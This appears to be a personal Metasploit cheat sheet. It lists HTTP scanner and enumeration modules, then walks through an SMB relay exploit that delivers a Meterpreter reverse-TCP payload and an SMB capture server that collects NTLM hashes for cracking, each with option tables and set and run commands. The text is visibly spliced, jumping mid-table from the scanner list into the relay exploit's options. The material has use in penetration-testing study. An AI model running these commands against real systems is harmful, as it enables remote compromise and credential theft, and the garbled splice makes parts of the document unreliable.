# Metasploit

TODO: Help me organize these modules to specific categories

```
msf > use auxiliary/scanner/http/scraper

msf auxiliary(scanner/http/scraper) > options

Module options (auxiliary/scanner/http/scraper):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   PATH     /                    yes       The test path to the page to analize
   PATTERN  <title>(.*)</title>  yes       The regex to use (default regex is a sample to grab page title)
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    80                   yes       The target port (TCP)
   SSL      false                no        Negotiate SSL/TLS for outgoing connections
   THREADS  1                    yes       The number of concurrent threads (max one per host)
   VHOST                         no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf auxiliary(scanner/http/scraper) > set path <uri_path>

msf auxiliary(scanner/http/scraper) > set pattern <regex>

msf auxiliary(scanner/http/scraper) > set threads 2

msf auxiliary(scanner/http/scraper) > set rhosts <target_IP_1>,<target_IP_2>,<target_IP_n>

msf auxiliary(scanner/http/scraper) > set rport <PORT>

msf auxiliary(scanner/http/scraper) > run
```

`msf > use auxiliary/scanner/http/http_hsts`

`msf > use auxiliary/scanner/http/title`

`msf > use auxiliary/scanner/http/http_header`

`msf > use auxiliary/scanner/http/host_header_injection`

`msf > use auxiliary/scanner/http/lucky_punch`

`msf > use auxiliary/scanner/http/verb_auth_bypass`

`msf > use auxiliary/scanner/http/open_proxy`

`msf > use auxiliary/scanner/http/options`

`msf > use auxiliary/scanner/http/enum_wayback`

`msf > use auxiliary/scanner/http/backup_file`

Apache Tomcat

`msf > use auxiliary/scanner/http/tomcat_enum`

Office 365

`msf > use auxiliary/gather/office365userenum`

`msf > use auxiliary/scanner/http/docker_version`

`msf > use auxiliary/scanner/http/git_scanner`

`msf > use auxiliary/scanner/http/svn_scanner`                    yes       Target address range or CIDR identifier to relay to
   RELAY_TIMEOUT         25               yes       Seconds that the relay socket will wait for a response after the client has initiated communication.
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBDomain             WORKGROUP        yes       The domain name used during SMB exchange.
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SRVHOST               0.0.0.0          yes       The local host to listen on.
   SRVPORT               445              yes       The local port to listen on.
   SRV_TIMEOUT           25               yes       Seconds that the server socket will wait for a response after the client has initiated communication.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(windows/smb/smb_relay) > set relay_targets <target1_IP>,<target2_IP>

msf exploit(windows/smb/smb_relay) > set johnpwfile ./relay_output.txt

msf exploit(windows/smb/smb_relay) > exploit
```

### 2.2 - Metasploit auxiliary module SMB server

```
msf > use auxiliary/server/capture/smb

msf auxiliary(server/capture/smb) > options

Module options (auxiliary/server/capture/smb):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   CAINPWFILE                   no        Name of file to store Cain&Abel hashes in. Only supports NTLMv1 hashes. Can be a path.
   CHALLENGE                    no        The 8 byte server challenge. Set values must be a valid 16 character hexadecimal pattern. If unset a valid random challenge is
                                           used.
   JOHNPWFILE                   no        Name of file to store JohnTheRipper hashes in. Supports NTLMv1 and NTLMv2 hashes, each of which is stored in separate files. C
                                          an also be a path.
   SMBDomain   WORKGROUP        yes       The domain name used during SMB exchange.
   SRVHOST     0.0.0.0          yes       The local host to listen on.
   SRVPORT     445              yes       The local port to listen on.
   TIMEOUT     5                yes       Seconds that the server socket will wait for a response after the client has initiated communication.


Auxiliary action:

   Name     Description
   ----     -----------
   Capture  Run SMB capture server



View the full module info with the info, or info -d command.

msf auxiliary(server/capture/smb) > set johnpwfile <hashes.txt>

msf auxiliary(server/capture/smb) > set srvhost <IP>

msf auxiliary(server/capture/smb) > set srvport <PORT>

msf auxiliary(server/capture/smb) > run
```

## References

- [Run ARP Poisoning Attacks with Metasploit and Detect Them with Wireshark](https://fabian-voith.de/2020/04/24/run-arp-poisoning-attacks-with-metasploit-and-detect-them-with-wireshark/)

- [Using Metasploit SMB Sniffer Module](https://blog.carnal0wnage.com/2009/04/using-metasploit-smb-sniffer-module.html)